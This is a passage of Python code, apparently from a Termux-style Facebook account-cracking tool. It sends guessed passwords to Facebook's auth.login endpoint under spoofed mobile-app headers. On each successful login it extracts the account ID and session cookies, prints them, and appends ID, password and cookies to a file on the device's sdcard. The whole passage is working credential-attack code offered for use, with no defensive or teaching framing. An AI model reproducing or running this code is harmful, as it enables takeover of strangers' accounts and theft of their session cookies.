                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                    'X-FB-Connection-Type': 'unknown',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-FB-HTTP-Engine': 'Liger'}  
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).json()
            if 'access_token' in po:
                coki = po["session_cookies"]
                cok = {}
                for x in coki:
                    cok.update({x["name"]:x["value"]})
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
                ids = re.findall('c_user=(.*);xs', kuki)[0]
                print(f'\r\r {bblack}[{G}BLACK-OK{bblack}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bblack}[{G}•{bblack}]{G} '+kuki+'')
                linex()
                open('/sdcard/BLACK-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
#———————————————#
try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
